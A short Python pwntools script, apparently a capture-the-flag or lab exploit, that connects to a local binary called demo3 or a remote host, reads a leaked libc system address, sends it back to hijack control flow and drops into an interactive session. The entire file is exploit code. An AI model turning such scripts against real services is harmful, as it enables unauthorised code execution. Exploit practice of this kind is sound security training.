#!/usr/bin/python
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])
    p = remote(addr,port)
else:
    p = process('./demo3')

system = u64(p.recv(8))
log.info("system@libc: " + hex(system))

p.sendline(p64(system))
p.interactive()
